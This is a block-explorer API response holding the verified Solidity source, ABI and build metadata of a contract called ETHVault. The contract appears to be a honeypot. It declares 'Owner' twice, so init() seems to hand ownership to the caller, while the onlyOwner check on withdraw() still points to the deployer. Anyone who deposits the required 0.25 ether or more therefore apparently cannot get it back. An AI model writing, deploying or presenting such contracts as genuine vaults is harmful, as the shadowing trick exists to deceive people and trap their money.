{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.12;\r\n\r\ncontract Owned {\r\n    address public Owner;\r\n    function Owned() { Owner = msg.sender; }\r\n    modifier onlyOwner { if( msg.sender == Owner ) _; }\r\n}\r\n\r\ncontract ETHVault is Owned {\r\n    address public Owner;\r\n    mapping (address => uint) public Deposits;\r\n    \r\n    function init() payable { Owner = msg.sender; deposit(); }\r\n    \r\n    function() payable { deposit(); }\r\n    \r\n    function deposit() payable {\r\n        if (!isContract(msg.sender))\r\n            if (msg.value >= 0.25 ether)\r\n                if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender])\r\n                    Deposits[msg.sender] += msg.value;\r\n    }\r\n    \r\n    function withdraw(uint amount) payable onlyOwner {\r\n        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender])\r\n            msg.sender.transfer(amount);\r\n    }\r\n    \r\n    function isContract(address addr) payable returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(addr) }\r\n        return size > 0;\r\n    }\r\n\r\n    function kill() payable onlyOwner {\r\n        require(this.balance == 0);\r\n        selfdestruct(msg.sender);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"isContract\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Deposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"payable\":true,\"type\":\"function\"},{\"payable\":true,\"type\":\"fallback\"}]","ContractName":"ETHVault","CompilerVersion":"v0.4.12+commit.194ff033","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://0887656a16e96ea937c1cbf2bf9ea7b294b5f6bd510c4d3b2a4215f2ce5ccefb"}]}